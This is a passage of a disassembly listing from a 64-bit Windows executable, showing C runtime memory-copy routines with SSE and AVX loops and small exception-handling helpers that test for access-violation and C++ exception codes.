   14000f37b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000f37f:	c3                   	ret
   14000f380:	4c 8b 02             	mov    (%rdx),%r8
   14000f383:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000f387:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000f38c:	4c 89 00             	mov    %r8,(%rax)
   14000f38f:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000f393:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   14000f397:	c3                   	ret
   14000f398:	0f b7 0a             	movzwl (%rdx),%ecx
   14000f39b:	66 89 08             	mov    %cx,(%rax)
   14000f39e:	c3                   	ret
   14000f39f:	90                   	nop
   14000f3a0:	8b 0a                	mov    (%rdx),%ecx
   14000f3a2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000f3a7:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   14000f3ac:	89 08                	mov    %ecx,(%rax)
   14000f3ae:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000f3b3:	44 88 48 06          	mov    %r9b,0x6(%rax)
   14000f3b7:	c3                   	ret
   14000f3b8:	4c 8b 02             	mov    (%rdx),%r8
   14000f3bb:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000f3be:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000f3c3:	4c 89 00             	mov    %r8,(%rax)
   14000f3c6:	89 48 08             	mov    %ecx,0x8(%rax)
   14000f3c9:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000f3ce:	c3                   	ret
   14000f3cf:	0f b7 0a             	movzwl (%rdx),%ecx
   14000f3d2:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   14000f3d7:	66 89 08             	mov    %cx,(%rax)
   14000f3da:	44 88 40 02          	mov    %r8b,0x2(%rax)
   14000f3de:	c3                   	ret
   14000f3df:	90                   	nop
   14000f3e0:	4c 8b 02             	mov    (%rdx),%r8
   14000f3e3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000f3e6:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   14000f3eb:	4c 89 00             	mov    %r8,(%rax)
   14000f3ee:	89 48 08             	mov    %ecx,0x8(%rax)
   14000f3f1:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   14000f3f5:	c3                   	ret
   14000f3f6:	4c 8b 02             	mov    (%rdx),%r8
   14000f3f9:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000f3fd:	4c 89 00             	mov    %r8,(%rax)
   14000f400:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000f404:	c3                   	ret
   14000f405:	4c 8b 02             	mov    (%rdx),%r8
   14000f408:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000f40c:	4c 89 00             	mov    %r8,(%rax)
   14000f40f:	88 48 08             	mov    %cl,0x8(%rax)
   14000f412:	c3                   	ret
   14000f413:	4c 8b 02             	mov    (%rdx),%r8
   14000f416:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000f419:	4c 89 00             	mov    %r8,(%rax)
   14000f41c:	89 48 08             	mov    %ecx,0x8(%rax)
   14000f41f:	c3                   	ret
   14000f420:	8b 0a                	mov    (%rdx),%ecx
   14000f422:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000f427:	89 08                	mov    %ecx,(%rax)
   14000f429:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000f42e:	c3                   	ret
   14000f42f:	8b 0a                	mov    (%rdx),%ecx
   14000f431:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   14000f436:	89 08                	mov    %ecx,(%rax)
   14000f438:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000f43c:	c3                   	ret
   14000f43d:	48 8b 0a             	mov    (%rdx),%rcx
   14000f440:	48 89 08             	mov    %rcx,(%rax)
   14000f443:	c3                   	ret
   14000f444:	0f b6 0a             	movzbl (%rdx),%ecx
   14000f447:	88 08                	mov    %cl,(%rax)
   14000f449:	c3                   	ret
   14000f44a:	8b 0a                	mov    (%rdx),%ecx
   14000f44c:	89 08                	mov    %ecx,(%rax)
   14000f44e:	c3                   	ret
   14000f44f:	90                   	nop
   14000f450:	49 83 f8 20          	cmp    $0x20,%r8
   14000f454:	77 17                	ja     0x14000f46d
   14000f456:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000f45a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   14000f461:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   14000f465:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   14000f46c:	c3                   	ret
   14000f46d:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   14000f471:	48 3b ca             	cmp    %rdx,%rcx
   14000f474:	4c 0f 46 c9          	cmovbe %rcx,%r9
   14000f478:	49 3b c9             	cmp    %r9,%rcx
   14000f47b:	0f 82 3f 04 00 00    	jb     0x14000f8c0
   14000f481:	83 3d d0 ab 00 00 03 	cmpl   $0x3,0xabd0(%rip)        # 0x14001a058
   14000f488:	0f 82 e2 02 00 00    	jb     0x14000f770
   14000f48e:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   14000f495:	76 16                	jbe    0x14000f4ad
   14000f497:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000f49e:	77 0d                	ja     0x14000f4ad
   14000f4a0:	f6 05 e1 bb 00 00 02 	testb  $0x2,0xbbe1(%rip)        # 0x14001b088
   14000f4a7:	0f 85 73 fe ff ff    	jne    0x14000f320
   14000f4ad:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   14000f4b1:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   14000f4b8:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f4bf:	0f 86 c3 00 00 00    	jbe    0x14000f588
   14000f4c5:	4c 8b c9             	mov    %rcx,%r9
   14000f4c8:	49 83 e1 1f          	and    $0x1f,%r9
   14000f4cc:	49 83 e9 20          	sub    $0x20,%r9
   14000f4d0:	49 2b c9             	sub    %r9,%rcx
   14000f4d3:	49 2b d1             	sub    %r9,%rdx
   14000f4d6:	4d 03 c1             	add    %r9,%r8
   14000f4d9:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f4e0:	0f 86 a2 00 00 00    	jbe    0x14000f588
   14000f4e6:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000f4ed:	0f 87 3d 01 00 00    	ja     0x14000f630
   14000f4f3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f4fa:	84 00 00 00 00 00 
   14000f500:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   14000f504:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   14000f509:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000f50e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   14000f513:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   14000f517:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   14000f51c:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   14000f521:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   14000f526:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000f52d:	00 
   14000f52e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   14000f535:	00 
   14000f536:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000f53d:	00 
   14000f53e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   14000f545:	00 
   14000f546:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   14000f54d:	00 
   14000f54e:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   14000f555:	00 
   14000f556:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   14000f55d:	00 
   14000f55e:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   14000f565:	00 
   14000f566:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000f56d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   14000f574:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000f57b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f582:	0f 83 78 ff ff ff    	jae    0x14000f500
   14000f588:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000f58c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000f590:	4d 8b d9             	mov    %r9,%r11
   14000f593:	49 c1 eb 05          	shr    $0x5,%r11
   14000f597:	47 8b 9c 9a d0 7b 01 	mov    0x17bd0(%r10,%r11,4),%r11d
   14000f59e:	00 
   14000f59f:	4d 03 da             	add    %r10,%r11
   14000f5a2:	41 ff e3             	jmp    *%r11
   14000f5a5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000f5ac:	ff ff ff 
   14000f5af:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   14000f5b6:	ff ff ff 
   14000f5b9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   14000f5c0:	ff ff ff 
   14000f5c3:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   14000f5ca:	ff ff ff 
   14000f5cd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   14000f5d4:	ff ff ff 
   14000f5d7:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   14000f5de:	ff ff ff 
   14000f5e1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   14000f5e8:	ff ff ff 
   14000f5eb:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   14000f5f2:	ff ff ff 
   14000f5f5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000f5fc:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   14000f603:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000f60a:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   14000f611:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   14000f618:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   14000f61f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   14000f626:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000f62a:	c5 f8 77             	vzeroupper
   14000f62d:	c3                   	ret
   14000f62e:	66 90                	xchg   %ax,%ax
   14000f630:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   14000f634:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   14000f639:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000f63e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   14000f643:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   14000f647:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   14000f64c:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   14000f651:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   14000f656:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000f65d:	00 
   14000f65e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   14000f665:	00 
   14000f666:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000f66d:	00 
   14000f66e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   14000f675:	00 
   14000f676:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   14000f67d:	00 
   14000f67e:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   14000f685:	00 
   14000f686:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   14000f68d:	00 
   14000f68e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   14000f695:	00 
   14000f696:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000f69d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   14000f6a4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000f6ab:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000f6b2:	0f 83 78 ff ff ff    	jae    0x14000f630
   14000f6b8:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000f6bc:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000f6c0:	4d 8b d9             	mov    %r9,%r11
   14000f6c3:	49 c1 eb 05          	shr    $0x5,%r11
   14000f6c7:	47 8b 9c 9a f4 7b 01 	mov    0x17bf4(%r10,%r11,4),%r11d
   14000f6ce:	00 
   14000f6cf:	4d 03 da             	add    %r10,%r11
   14000f6d2:	41 ff e3             	jmp    *%r11
   14000f6d5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000f6dc:	ff ff ff 
   14000f6df:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   14000f6e6:	ff ff ff 
   14000f6e9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   14000f6f0:	ff ff ff 
   14000f6f3:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   14000f6fa:	ff ff ff 
   14000f6fd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   14000f704:	ff ff ff 
   14000f707:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   14000f70e:	ff ff ff 
   14000f711:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   14000f718:	ff ff ff 
   14000f71b:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   14000f722:	ff ff ff 
   14000f725:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000f72c:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   14000f733:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000f73a:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   14000f741:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   14000f748:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   14000f74f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   14000f756:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000f75a:	0f ae f8             	sfence
   14000f75d:	c5 f8 77             	vzeroupper
   14000f760:	c3                   	ret
   14000f761:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f768:	0f 1f 84 00 00 00 00 
   14000f76f:	00 
   14000f770:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   14000f777:	76 0d                	jbe    0x14000f786
   14000f779:	f6 05 08 b9 00 00 02 	testb  $0x2,0xb908(%rip)        # 0x14001b088
   14000f780:	0f 85 9a fb ff ff    	jne    0x14000f320
   14000f786:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000f78a:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   14000f791:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000f798:	0f 86 8e 00 00 00    	jbe    0x14000f82c
   14000f79e:	4c 8b c9             	mov    %rcx,%r9
   14000f7a1:	49 83 e1 0f          	and    $0xf,%r9
   14000f7a5:	49 83 e9 10          	sub    $0x10,%r9
   14000f7a9:	49 2b c9             	sub    %r9,%rcx
   14000f7ac:	49 2b d1             	sub    %r9,%rdx
   14000f7af:	4d 03 c1             	add    %r9,%r8
   14000f7b2:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000f7b9:	76 71                	jbe    0x14000f82c
   14000f7bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000f7c0:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000f7c4:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   14000f7c9:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   14000f7ce:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   14000f7d3:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   14000f7d7:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   14000f7dc:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   14000f7e1:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   14000f7e6:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   14000f7eb:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   14000f7f0:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   14000f7f5:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   14000f7fa:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   14000f7ff:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   14000f804:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   14000f809:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   14000f80e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000f815:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   14000f81c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   14000f823:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000f82a:	73 94                	jae    0x14000f7c0
   14000f82c:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   14000f830:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000f834:	4d 8b d9             	mov    %r9,%r11
   14000f837:	49 c1 eb 04          	shr    $0x4,%r11
   14000f83b:	47 8b 9c 9a 18 7c 01 	mov    0x17c18(%r10,%r11,4),%r11d
   14000f842:	00 
   14000f843:	4d 03 da             	add    %r10,%r11
   14000f846:	41 ff e3             	jmp    *%r11
   14000f849:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   14000f850:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   14000f857:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   14000f85e:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   14000f865:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   14000f86c:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   14000f873:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   14000f87a:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   14000f881:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   14000f888:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   14000f88f:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   14000f896:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   14000f89d:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   14000f8a4:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   14000f8ab:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   14000f8b2:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000f8b6:	c3                   	ret
   14000f8b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000f8be:	00 00 
   14000f8c0:	0f 10 12             	movups (%rdx),%xmm2
   14000f8c3:	48 2b d1             	sub    %rcx,%rdx
   14000f8c6:	49 03 c8             	add    %r8,%rcx
   14000f8c9:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000f8ce:	48 83 e9 10          	sub    $0x10,%rcx
   14000f8d2:	49 83 e8 10          	sub    $0x10,%r8
   14000f8d6:	f6 c1 0f             	test   $0xf,%cl
   14000f8d9:	74 18                	je     0x14000f8f3
   14000f8db:	4c 8b c9             	mov    %rcx,%r9
   14000f8de:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000f8e2:	0f 10 c8             	movups %xmm0,%xmm1
   14000f8e5:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000f8e9:	41 0f 11 09          	movups %xmm1,(%r9)
   14000f8ed:	4c 8b c1             	mov    %rcx,%r8
   14000f8f0:	4c 2b c0             	sub    %rax,%r8
   14000f8f3:	4d 8b c8             	mov    %r8,%r9
   14000f8f6:	49 c1 e9 07          	shr    $0x7,%r9
   14000f8fa:	74 71                	je     0x14000f96d
   14000f8fc:	0f 29 01             	movaps %xmm0,(%rcx)
   14000f8ff:	eb 16                	jmp    0x14000f917
   14000f901:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000f908:	0f 1f 84 00 00 00 00 
   14000f90f:	00 
   14000f910:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000f914:	0f 29 09             	movaps %xmm1,(%rcx)
   14000f917:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000f91c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   14000f921:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   14000f928:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000f92c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   14000f930:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   14000f935:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   14000f93a:	49 ff c9             	dec    %r9
   14000f93d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   14000f941:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   14000f945:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   14000f94a:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   14000f94f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   14000f953:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   14000f957:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   14000f95c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   14000f960:	75 ae                	jne    0x14000f910
   14000f962:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000f966:	49 83 e0 7f          	and    $0x7f,%r8
   14000f96a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000f96d:	4d 8b c8             	mov    %r8,%r9
   14000f970:	49 c1 e9 04          	shr    $0x4,%r9
   14000f974:	74 1a                	je     0x14000f990
   14000f976:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f97d:	00 00 00 
   14000f980:	0f 11 01             	movups %xmm0,(%rcx)
   14000f983:	48 83 e9 10          	sub    $0x10,%rcx
   14000f987:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000f98b:	49 ff c9             	dec    %r9
   14000f98e:	75 f0                	jne    0x14000f980
   14000f990:	49 83 e0 0f          	and    $0xf,%r8
   14000f994:	74 03                	je     0x14000f999
   14000f996:	0f 11 10             	movups %xmm2,(%rax)
   14000f999:	0f 11 01             	movups %xmm0,(%rcx)
   14000f99c:	c3                   	ret
   14000f99d:	cc                   	int3
   14000f99e:	cc                   	int3
   14000f99f:	cc                   	int3
   14000f9a0:	cc                   	int3
   14000f9a1:	cc                   	int3
   14000f9a2:	cc                   	int3
   14000f9a3:	cc                   	int3
   14000f9a4:	cc                   	int3
   14000f9a5:	cc                   	int3
   14000f9a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000f9ad:	00 00 00 
   14000f9b0:	40 55                	rex push %rbp
   14000f9b2:	48 83 ec 20          	sub    $0x20,%rsp
   14000f9b6:	48 8b ea             	mov    %rdx,%rbp
   14000f9b9:	48 8b 01             	mov    (%rcx),%rax
   14000f9bc:	48 8b d1             	mov    %rcx,%rdx
   14000f9bf:	8b 08                	mov    (%rax),%ecx
   14000f9c1:	e8 2a 4f ff ff       	call   0x1400048f0
   14000f9c6:	90                   	nop
   14000f9c7:	48 83 c4 20          	add    $0x20,%rsp
   14000f9cb:	5d                   	pop    %rbp
   14000f9cc:	c3                   	ret
   14000f9cd:	cc                   	int3
   14000f9ce:	40 55                	rex push %rbp
   14000f9d0:	48 8b ea             	mov    %rdx,%rbp
   14000f9d3:	48 8b 01             	mov    (%rcx),%rax
   14000f9d6:	33 c9                	xor    %ecx,%ecx
   14000f9d8:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000f9de:	0f 94 c1             	sete   %cl
   14000f9e1:	8b c1                	mov    %ecx,%eax
   14000f9e3:	5d                   	pop    %rbp
   14000f9e4:	c3                   	ret
   14000f9e5:	cc                   	int3
   14000f9e6:	40 53                	rex push %rbx
   14000f9e8:	55                   	push   %rbp
   14000f9e9:	48 83 ec 28          	sub    $0x28,%rsp
   14000f9ed:	48 8b ea             	mov    %rdx,%rbp
   14000f9f0:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   14000f9f4:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   14000f9f8:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   14000f9fc:	74 6c                	je     0x14000fa6a
   14000f9fe:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000fa02:	48 8b 08             	mov    (%rax),%rcx
   14000fa05:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000fa09:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000fa0d:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000fa13:	75 55                	jne    0x14000fa6a
   14000fa15:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000fa19:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000fa1d:	75 4b                	jne    0x14000fa6a
   14000fa1f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000fa23:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000fa2a:	74 1a                	je     0x14000fa46
   14000fa2c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000fa30:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000fa37:	74 0d                	je     0x14000fa46
   14000fa39:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000fa3d:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000fa44:	75 24                	jne    0x14000fa6a
   14000fa46:	e8 c1 2b ff ff       	call   0x14000260c
   14000fa4b:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000fa4f:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000fa53:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000fa57:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000fa5b:	e8 ac 2b ff ff       	call   0x14000260c
   14000fa60:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000fa64:	e8 ff 62 ff ff       	call   0x140005d68
   14000fa69:	90                   	nop
   14000fa6a:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000fa71:	8b 45 20             	mov    0x20(%rbp),%eax
   14000fa74:	48 83 c4 28          	add    $0x28,%rsp
   14000fa78:	5d                   	pop    %rbp
   14000fa79:	5b                   	pop    %rbx
   14000fa7a:	c3                   	ret
   14000fa7b:	cc                   	int3
   14000fa7c:	40 53                	rex push %rbx
   14000fa7e:	55                   	push   %rbp
   14000fa7f:	57                   	push   %rdi
   14000fa80:	48 83 ec 40          	sub    $0x40,%rsp
   14000fa84:	48 8b ea             	mov    %rdx,%rbp
   14000fa87:	48 89 4d 50          	mov    %rcx,0x50(%rbp)
